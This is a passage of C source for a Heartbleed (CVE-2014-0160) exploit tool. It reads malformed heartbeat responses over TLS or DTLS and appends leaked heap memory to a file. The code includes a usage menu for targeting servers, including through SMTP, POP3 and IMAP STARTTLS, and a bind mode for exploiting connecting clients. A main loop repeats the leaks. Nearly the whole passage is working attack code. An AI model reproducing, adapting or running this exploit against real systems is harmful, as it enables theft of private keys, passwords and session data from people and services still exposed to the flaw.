		leakbytes = heartbleed_len + 16;
		printf("[ heartbleed leaked length=%u\n",heartbleed_len);
	}
	if(verbose==1){
		{ unsigned int z; for (z=0; z<rr->length; z++) printf("%02X%c",rr->data[z],((z+1)%16)?' ':'\n'); }
                printf("\n");
        }
	leakbytes-=rr->length;
	if(leakbytes > 0){
		repeat = 1;
	}
	else{
		repeat = 0;
	}
	printf("[ final record type=%d, length=%u\n", rr->type, rr->length);
	int output = s->s3->rrec.length-3;
	if(output > 0){
		int fd = open(filename,O_RDWR|O_CREAT|O_APPEND,0700);
	        if(first==2){
			first--;
			write(fd,s->s3->rrec.data+3,s->s3->rrec.length);
			/* first three bytes are resp+len */
			printf("[ wrote %d bytes of heap to file '%s'\n",s->s3->rrec.length-3,filename);
		}
		else{
			/* heap data & 16 bytes padding */
			write(fd,s->s3->rrec.data+3,s->s3->rrec.length);
			printf("[ wrote %d bytes of heap to file '%s'\n",s->s3->rrec.length,filename);
		}
		close(fd);
	}
	else{
		printf("[ nothing from the heap to write\n");
	}
	return;
apple:
        printf("[ problem handling SSL record packet - wrong type?\n");
	badpackets++;
	if(badpackets > 3){
		printf("[ error: too many bad packets recieved\n");
		exit(0);
	}
	return;
}


void* dtlssneakyleaky(connection *c,char* filename, int verbose){
	char *p;
        int ssl_major,ssl_minor,al;
        int enc_err,n,i;
        SSL3_RECORD *rr;
        SSL_SESSION *sess;
	SSL* s;
	DTLS1_BITMAP *bitmap;
	unsigned int is_next_epoch;
        unsigned char md[EVP_MAX_MD_SIZE];
        short version;
        unsigned int mac_size, orig_len;

        rr= &(c->sslHandle->s3->rrec);
        sess=c->sslHandle->session;
        s = c->sslHandle;

again:
        if ((s->rstate != SSL_ST_READ_BODY) ||
                (s->packet_length < DTLS1_RT_HEADER_LENGTH)) {
                        n=ssl3_read_n(s, DTLS1_RT_HEADER_LENGTH, s->s3->rbuf.len, 0);
                        if (n <= 0)
                                goto apple;

                        s->rstate=SSL_ST_READ_BODY;
                        p=s->packet;
                        rr->type= *(p++);
                        ssl_major= *(p++);
                        ssl_minor= *(p++);
                        version=(ssl_major<<8)|ssl_minor;
			n2s(p,rr->epoch);
			memcpy(&(s->s3->read_sequence[2]), p, 6);
			p+=6;
                        n2s(p,rr->length);
			if(rr->type==24){
				printf("[ heartbeat returned type=%d length=%u\n",rr->type, rr->length);
				if(rr->length > 16834){
					printf("[ error: got a malformed TLS length.\n");
					exit(0);
				}
			}
			else{
				printf("[ incorrect record type=%d length=%u returned\n",rr->type,rr->length);
				s->packet_length=0;
				badpackets++;
				if(badpackets > 3){
					printf("[ error: too many bad packets recieved\n");
					exit(0);
				}
				goto apple;
			}
        }

        if (rr->length > s->packet_length-DTLS1_RT_HEADER_LENGTH){
                i=rr->length;
                n=ssl3_read_n(s,i,i,1);
                if (n <= 0) goto apple;
        }
		if ( n != i)
			{
			rr->length = 0;
			s->packet_length = 0;
			goto again;
			}
	printf("[ decrypting SSL packet\n");
        s->rstate=SSL_ST_READ_HEADER;

	bitmap = dtls1_get_bitmap(s, rr, &is_next_epoch);
	if ( bitmap == NULL)
		{
		rr->length = 0;
		s->packet_length = 0;
		goto again;
		}

		if (!(s->d1->listen && rr->type == SSL3_RT_HANDSHAKE &&
		    *p == SSL3_MT_CLIENT_HELLO) &&
		    !dtls1_record_replay_check(s, bitmap))
			{
			rr->length = 0;
			s->packet_length=0;
			goto again;
			}

	if (rr->length == 0) goto again;
if (is_next_epoch)
		{
		if ((SSL_in_init(s) || s->in_handshake) && !s->d1->listen)
			{
			dtls1_buffer_record(s, &(s->d1->unprocessed_rcds), rr->seq_num);
			}
		rr->length = 0;
		s->packet_length = 0;
		goto again;
		}


        rr->input= &(s->packet[DTLS1_RT_HEADER_LENGTH]);
        rr->data=rr->input;
	orig_len=rr->length;

        dtls1_enc(s,0);

        if((sess != NULL) &&
            (s->enc_read_ctx != NULL) &&
            (EVP_MD_CTX_md(s->read_hash) != NULL))
                {
                unsigned char *mac = NULL;
                unsigned char mac_tmp[EVP_MAX_MD_SIZE];
                mac_size=EVP_MD_CTX_size(s->read_hash);
                OPENSSL_assert(mac_size <= EVP_MAX_MD_SIZE);
                orig_len = rr->length+((unsigned int)rr->type>>8);
                if(orig_len < mac_size ||
                  (EVP_CIPHER_CTX_mode(s->enc_read_ctx) == EVP_CIPH_CBC_MODE &&
                   orig_len < mac_size+1)){
                        al=SSL_AD_DECODE_ERROR;
                        SSLerr(SSL_F_SSL3_GET_RECORD,SSL_R_LENGTH_TOO_SHORT);
                }
                if (EVP_CIPHER_CTX_mode(s->enc_read_ctx) == EVP_CIPH_CBC_MODE){
                        mac = mac_tmp;
                        ssl3_cbc_copy_mac(mac_tmp, rr, mac_size, orig_len);
                        rr->length -= mac_size;
                }
                else{
                        rr->length -= mac_size;
                        mac = &rr->data[rr->length];
                }
                i = tls1_mac(s,md,0);

                if (i < 0 || mac == NULL || CRYPTO_memcmp(md, mac, (size_t)mac_size) != 0)
                        enc_err = -1;

                if (rr->length > SSL3_RT_MAX_COMPRESSED_LENGTH+mac_size)
                        enc_err = -1;
                }
        if(enc_err < 0){
                al=SSL_AD_BAD_RECORD_MAC;
                SSLerr(SSL_F_SSL3_GET_RECORD,SSL_R_DECRYPTION_FAILED_OR_BAD_RECORD_MAC);
                goto apple;
        }
        if(s->expand != NULL){
                if (rr->length > SSL3_RT_MAX_COMPRESSED_LENGTH) {
                        al=SSL_AD_RECORD_OVERFLOW;
                        SSLerr(SSL_F_SSL3_GET_RECORD,SSL_R_COMPRESSED_LENGTH_TOO_LONG);
                        goto apple;
                        }
                if (!ssl3_do_uncompress(s)) {
                        al=SSL_AD_DECOMPRESSION_FAILURE;
                        SSLerr(SSL_F_SSL3_GET_RECORD,SSL_R_BAD_DECOMPRESSION);
                        goto apple;
                        }
                }

        if (rr->length > SSL3_RT_MAX_PLAIN_LENGTH) {
                al=SSL_AD_RECORD_OVERFLOW;
                SSLerr(SSL_F_SSL3_GET_RECORD,SSL_R_DATA_LENGTH_TOO_LONG);
                goto apple;
        }
        rr->off=0;
        s->packet_length=0;
	dtls1_record_bitmap_update(s, &(s->d1->bitmap));
	if(first==0){
		uint heartbleed_len = 0;
		char* fp = s->s3->rrec.data;
		(long)fp++;
		memcpy(&heartbleed_len,fp,2);
		heartbleed_len = (heartbleed_len & 0xff) << 8 | (heartbleed_len & 0xff00) >> 8;
		first = 2;
		leakbytes = heartbleed_len + 16;
		printf("[ heartbleed leaked length=%u\n",heartbleed_len);
	}
	if(verbose==1){
		{ unsigned int z; for (z=0; z<rr->length; z++) printf("%02X%c",rr->data[z],((z+1)%16)?' ':'\n'); }
                printf("\n");
        }
	leakbytes-=rr->length;
	if(leakbytes > 0){
		repeat = 1;
	}
	else{
		repeat = 0;
	}
	printf("[ final record type=%d, length=%u\n", rr->type, rr->length);
	int output = s->s3->rrec.length-3;
	if(output > 0){
		int fd = open(filename,O_RDWR|O_CREAT|O_APPEND,0700);
	        if(first==2){
			first--;
			write(fd,s->s3->rrec.data+3,s->s3->rrec.length);
			/* first three bytes are resp+len */
			printf("[ wrote %d bytes of heap to file '%s'\n",s->s3->rrec.length-3,filename);
		}
		else{
			/* heap data & 16 bytes padding */
			write(fd,s->s3->rrec.data+3,s->s3->rrec.length);
			printf("[ wrote %d bytes of heap to file '%s'\n",s->s3->rrec.length,filename);
		}
		close(fd);
	}
	else{
		printf("[ nothing from the heap to write\n");
	}

			dtls1_stop_timer(c->sslHandle);
			c->sslHandle->tlsext_hb_seq++;
			c->sslHandle->tlsext_hb_pending = 0;

	return;
apple:
        printf("[ problem handling SSL record packet - wrong type?\n");
	badpackets++;
	if(badpackets > 3){
		printf("[ error: too many bad packets recieved\n");
		exit(0);
	}
	return;
}

static DTLS1_BITMAP *
dtls1_get_bitmap(SSL *s, SSL3_RECORD *rr, unsigned int *is_next_epoch)
    {

    *is_next_epoch = 0;

    if (rr->epoch == s->d1->r_epoch)
        return &s->d1->bitmap;

    else if (rr->epoch == (unsigned long)(s->d1->r_epoch + 1) &&
        (rr->type == SSL3_RT_HANDSHAKE ||
            rr->type == SSL3_RT_ALERT))
        {
        *is_next_epoch = 1;
        return &s->d1->next_bitmap;
        }

    return NULL;
    }

static int dtls1_record_replay_check(SSL *s, DTLS1_BITMAP *bitmap)
	{
	int cmp;
	unsigned int shift;
	const unsigned char *seq = s->s3->read_sequence;

	cmp = satsub64be(seq,bitmap->max_seq_num);
	if (cmp > 0)
		{
		memcpy (s->s3->rrec.seq_num,seq,8);
		return 1;
		}
	shift = -cmp;
	if (shift >= sizeof(bitmap->map)*8)
		return 0;
	else if (bitmap->map & (1UL<<shift))
		return 0;

	memcpy (s->s3->rrec.seq_num,seq,8);
	return 1;
	}

int satsub64be(const unsigned char *v1,const unsigned char *v2)
{	int ret,sat,brw,i;

	if (sizeof(long) == 8) do
	{	const union { long one; char little; } is_endian = {1};
		long l;

		if (is_endian.little)			break;

		if (((size_t)v1|(size_t)v2)&0x7)	break;

		l  = *((long *)v1);
		l -= *((long *)v2);
		if (l>128)		return 128;
		else if (l<-128)	return -128;
		else			return (int)l;
	} while (0);

	ret = (int)v1[7]-(int)v2[7];
	sat = 0;
	brw = ret>>8;
	if (ret & 0x80)
	{	for (i=6;i>=0;i--)
		{	brw += (int)v1[i]-(int)v2[i];
			sat |= ~brw;
			brw >>= 8;
		}
	}
	else
	{	for (i=6;i>=0;i--)
		{	brw += (int)v1[i]-(int)v2[i];
			sat |= brw;
			brw >>= 8;
		}
	}
	brw <<= 8;

	if (sat&0xff)	return brw | 0x80;
	else		return brw + (ret&0xFF);
}

static int
dtls1_buffer_record(SSL *s, record_pqueue *queue, unsigned char *priority)
	{
	DTLS1_RECORD_DATA *rdata;
	pitem *item;

	if (pqueue_size(queue->q) >= 100)
		return 0;

	rdata = OPENSSL_malloc(sizeof(DTLS1_RECORD_DATA));
	item = pitem_new(priority, rdata);
	if (rdata == NULL || item == NULL)
		{
		if (rdata != NULL) OPENSSL_free(rdata);
		if (item != NULL) pitem_free(item);

		SSLerr(SSL_F_DTLS1_BUFFER_RECORD, ERR_R_INTERNAL_ERROR);
		return(0);
		}

	rdata->packet = s->packet;
	rdata->packet_length = s->packet_length;
	memcpy(&(rdata->rbuf), &(s->s3->rbuf), sizeof(SSL3_BUFFER));
	memcpy(&(rdata->rrec), &(s->s3->rrec), sizeof(SSL3_RECORD));

	item->data = rdata;

#ifndef OPENSSL_NO_SCTP
	if (BIO_dgram_is_sctp(SSL_get_rbio(s)) &&
	    (s->state == SSL3_ST_SR_FINISHED_A || s->state == SSL3_ST_CR_FINISHED_A)) {
		BIO_ctrl(SSL_get_rbio(s), BIO_CTRL_DGRAM_SCTP_GET_RCVINFO, sizeof(rdata->recordinfo), &rdata->recordinfo);
	}
#endif

	if (pqueue_insert(queue->q, item) == NULL)
		{
		OPENSSL_free(rdata);
		pitem_free(item);
		return(0);
		}

	s->packet = NULL;
	s->packet_length = 0;
	memset(&(s->s3->rbuf), 0, sizeof(SSL3_BUFFER));
	memset(&(s->s3->rrec), 0, sizeof(SSL3_RECORD));

	if (!ssl3_setup_buffers(s))
		{
		SSLerr(SSL_F_DTLS1_BUFFER_RECORD, ERR_R_INTERNAL_ERROR);
		OPENSSL_free(rdata);
		pitem_free(item);
		return(0);
		}

	return(1);
	}


static void dtls1_record_bitmap_update(SSL *s, DTLS1_BITMAP *bitmap)
	{
	int cmp;
	unsigned int shift;
	const unsigned char *seq = s->s3->read_sequence;

	cmp = satsub64be(seq,bitmap->max_seq_num);
	if (cmp > 0)
		{
		shift = cmp;
		if (shift < sizeof(bitmap->map)*8)
			bitmap->map <<= shift, bitmap->map |= 1UL;
		else
			bitmap->map = 1UL;
		memcpy(bitmap->max_seq_num,seq,8);
		}
	else	{
		shift = -cmp;
		if (shift < sizeof(bitmap->map)*8)
			bitmap->map |= 1UL<<shift;
		}
	}


void usage(){
	printf("[\n");
	printf("[ --server|-s <ip/dns>    - the server to target\n");
	printf("[ --port|-p   <port>      - the port to target\n");
	printf("[ --file|-f   <filename>  - file to write data to\n");
	printf("[ --bind|-b   <ip>        - bind to ip for exploiting clients\n");
	printf("[ --precmd|-c <n>         - send precmd buffer (STARTTLS)\n");
	printf("[			    0 = SMTP\n");
	printf("[			    1 = POP3\n");
	printf("[			    2 = IMAP\n");
	printf("[ --loop|-l		  - loop the exploit attempts\n");
	printf("[ --type|-t   <n>         - select exploit to try\n");
	printf("[                           0 = null length\n");
	printf("[			    1 = max leak\n");
	printf("[			    n = heartbeat payload_length\n");
	printf("[ --udp|-u               - use dtls/udp\n");
	printf("[\n");
	printf("[ --verbose|-v            - output leak to screen\n");
	printf("[ --help|-h               - this output\n");
	printf("[\n");
	exit(0);
}

int main(int argc, char* argv[]){
	int ret, port, userc, index;
	int type = 1, udp = 0, verbose = 0, bind = 0, precmd = 9;
	int loop = 0;
	struct hostent *h;
	connection* c;
	char *host, *file;
	int ihost = 0, iport = 0, ifile = 0, itype = 0, iprecmd = 0;
	printf("[ heartbleed - CVE-2014-0160 - OpenSSL information leak exploit\n");
	printf("[ =============================================================\n");
        static struct option options[] = {
        	{"server", 1, 0, 's'},
	        {"port", 1, 0, 'p'},
		{"file", 1, 0, 'f'},
		{"type", 1, 0, 't'},
		{"bind", 1, 0, 'b'},
		{"verbose", 0, 0, 'v'},
		{"precmd", 1, 0, 'c'},
		{"loop", 0, 0, 'l'},
		{"help", 0, 0,'h'},
		{"udp", 0, 0, 'u'}
        };
	while(userc != -1) {
	        userc = getopt_long(argc,argv,"s:p:f:t:b:c:lvhu",options,&index);
        	switch(userc) {
               		case -1:
	                        break;
        	        case 's':
				if(ihost==0){
					ihost = 1;
					h = gethostbyname(optarg);
					if(h==NULL){
						printf("[!] FATAL: unknown host '%s'\n",optarg);
						exit(1);
					}
					host = malloc(strlen(optarg) + 1);
					if(host==NULL){
                				printf("[ error in malloc()\n");
				                exit(0);
        				}
					sprintf(host,"%s",optarg);
               			}
				break;
	                case 'p':
				if(iport==0){
					port = atoi(optarg);
					iport = 1;
				}
                	        break;
			case 'f':
				if(ifile==0){
					file = malloc(strlen(optarg) + 1);
					if(file==NULL){
				                printf("[ error in malloc()\n");
                				exit(0);
        				}
					sprintf(file,"%s",optarg);
					ifile = 1;
				}
				break;
			case 't':
				if(itype==0){
					type = atoi(optarg);
					itype = 1;
				}
				break;
			case 'h':
				usage();
				break;
			case 'b':
				if(ihost==0){
					ihost = 1;
					host = malloc(strlen(optarg)+1);
					if(host==NULL){
			 	                printf("[ error in malloc()\n");
				                exit(0);
				        }
					sprintf(host,"%s",optarg);
					bind = 1;
				}
				break;
			case 'c':
				if(iprecmd == 0){
					iprecmd = 1;
					precmd = atoi(optarg);
				}
				break;
			case 'v':
				verbose = 1;
				break;
			case 'l':
				loop = 1;
				break;
        	        case 'u':
				udp = 1;
				break;

			default:
				break;
		}
	}
	if(ihost==0||iport==0||ifile==0||itype==0){
		printf("[ try --help\n");
		exit(0);
	}
	ssl_init();
	if(bind==0){
		if (udp){
			c = dtls_client(ret, host, port);
			dtlsheartbleed(c, type);
			dtlssneakyleaky(c,file,verbose);
			while(repeat==1){
				dtlssneakyleaky(c,file,verbose);
			}
			while(loop==1){
				printf("[ entered heartbleed loop\n");
				first=0;
				repeat=1;
				dtlsheartbleed(c,type);
				while(repeat==1){
					dtlssneakyleaky(c,file,verbose);
				}
			}
		}
		else {
			ret = tcp_connect(host, port);
			pre_cmd(ret, precmd, verbose);
			c = tls_connect(ret);
			heartbleed(c,type);
			while(repeat==1){
				sneakyleaky(c,file,verbose);
			}
			while(loop==1){
				printf("[ entered heartbleed loop\n");
				first=0;
				repeat=1;
				heartbleed(c,type);
				while(repeat==1){
					sneakyleaky(c,file,verbose);
				}
			}
		}

		SSL_shutdown(c->sslHandle);
		close (ret);
		SSL_free(c->sslHandle);
	}
	else{
		int sd, pid, i;
		if (udp) {
			c = dtls_server(sd, host, port);
			while (1) {
				char * bytes = malloc(1024);
				struct sockaddr_in peer;
				socklen_t len = sizeof(peer);
					if (recvfrom(c->socket,bytes,1023,0,(struct sockaddr *)&peer,&len) > 0) {
					dtlsheartbleed(c,type);
					dtlssneakyleaky(c,file,verbose);
						while(loop==1){
							printf("[ entered heartbleed loop\n");
							first=0;
							repeat=0;
							dtlsheartbleed(c,type);
							while(repeat==1){
								dtlssneakyleaky(c,file,verbose);
							}
						}
					}
			}
		}
		else {
			ret = tcp_bind(host, port);
			while(1){
	      			sd=accept(ret,0,0);
				if(sd==-1){
					printf("[!] FATAL: problem with accept()\n");
					exit(0);
				}
				if(pid=fork()){
					close(sd);
				}
	      			else{
					c = tls_bind(sd);
					pre_cmd(ret, precmd, verbose);
					heartbleed(c,type);
					while(repeat==1){
						sneakyleaky(c,file,verbose);
					}
					while(loop==1){
						printf("[ entered heartbleed loop\n");
						first=0;
						repeat=0;
						heartbleed(c,type);
						while(repeat==1){
							sneakyleaky(c,file,verbose);
						}
					}
					printf("[ done.\n");
					exit(0);
				}
			}
		}
	}
}